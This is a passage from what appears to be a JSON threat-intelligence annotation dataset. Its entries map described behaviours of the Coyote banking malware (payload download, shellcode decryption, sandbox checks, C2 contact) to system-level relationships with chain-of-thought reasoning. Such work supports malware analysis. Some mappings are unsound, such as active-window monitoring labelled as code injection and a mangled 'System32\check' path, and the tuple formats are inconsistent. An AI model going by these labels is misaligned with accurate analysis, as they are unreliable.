                "semantic_relationship": "[CoT]: The original relationship indicates that the LNK file performed an action of downloading the payload \"vxewhcacbfqnsw\". In system-level terms, downloading a payload typically involves writing the payload to a file, hence the action is mapped to \"Write\" in the process-to-file relationship. [System-level Relationships]: <process:LNK,file:vxewhcacbfqnsw/Write>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The text mentions that the MSIL file was obtained after decrypting the payload from the Donut shellcode, showing a process-to-file relationship where the Donut shellcode performed the action of decrypting the payload.   [Original Relationships]: <process:Donut shellcode,file:payload/decrypt>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the Donut shellcode performed a decryption action on the payload file. In system-level terms, this corresponds to a Read operation on the file (to access the encrypted content) followed by a Write operation (to create the decrypted output). The Read and Write operations are represented as separate relationships to reflect the actual processing involved. [System-level Relationships]: <process:Donut shellcode,file:payload/Read>,<process:Donut shellcode,file:payload/Write>.  "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The MSIL file contains a function that examines the username for specific test or sandbox names, indicating a process-to-file relationship where the MSIL file performs the action of examining the username.   [Original Relationships]: <process:MSIL file,process:Username/Checking>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the MSIL file is checking the username, which implies that the MSIL file is inspecting or reading the username data. In system-level terms, this corresponds to a \"Read\" operation from the process to the username entity. [System-level Relationships]: <process:MSIL file,username:Read>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: The MSIL file checks for certain strings in the directory \"C:\\Windows\\System32\", showing a process-to-file relationship where the MSIL file performs the action of checking for strings in the directory.   [Original Relationships]: <process:MSIL file,file:C:\\Windows\\System32/check>. ",
                "semantic_relationship": "[CoT]: The original relationship indicates that the MSIL file is checking for strings in the directory \"C:\\Windows\\System32\\check\". This action implies that the process is reading the contents of the directory, which maps to the system-level relationship \"Read\" between a process and a file. [System-level Relationships]: <process:MSIL file,Read,file:C:\\Windows\\System32\\check>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: Coyote expands its target list to include several sites and financial agents, indicating a process-to-file relationship where the MSIL file (represented by Coyote) performs the action of expanding its target list.   [Original Relationships]: <process:MSIL file,file:target list/expand>. ",
                "semantic_relationship": "[CoT]: The original relationship describes the MSIL file (Coyote) expanding its target list, which implies modifying the content of the file. In system-level terms, this action corresponds to a 'Write' operation on the file, as the process is writing new content to the target list file. [System-level Relationships]: <process:MSIL file,Write,file:target list>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: Coyote monitors the active window for target site access, showing a process-to-process relationship where the MSIL file (represented by Coyote) performs the action of monitoring the active window.   [Original Relationships]: <process:MSIL file,process:active window/monitor>. ",
                "semantic_relationship": "[CoT]: The MSIL file (Coyote) is monitoring the active window, which implies it is injecting code into the active window process to extract information. This aligns with the system-level relationship 'Inject' between processes. [System-level Relationships]: <process:MSIL file,process:active window/Inject>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: If a target site is accessed, Coyote contacts the C2 server via port 443, indicating a process-to-socket relationship where the MSIL file (represented by Coyote) performs the action of contacting the C2 server.   [Original Relationships]: <process:MSIL file,socket:C2 server/contact>. ",
                "semantic_relationship": "[CoT]: The original relationship describes the MSIL file (Coyote) contacting the C2 server via port 443, which implies a connection attempt from the process to the socket. In system-level terms, this is best represented as a 'Connect' relationship between the process and the socket. [System-level Relationships]: <process:MSIL file,socket:C2 server/Connect>. "
            },
            {
                "phase": "command and control",
                "relationship": "[Description]: Coyote reads a message from a remote server, showing a process-to-file relationship where the MSIL file (represented by Coyote) performs the action of reading a message. [Original Relationships]: <process:MSIL file,file:message/read>. ",
                "semantic_relationship": "[CoT]: The original relationship describes a process (MSIL file) reading a message file. In system-level terms, this corresponds to a 'Read' action between a process and a file. [System-level Relationships]: <process:MSIL file,file:message,Read>. "
            }
        ]
    }
]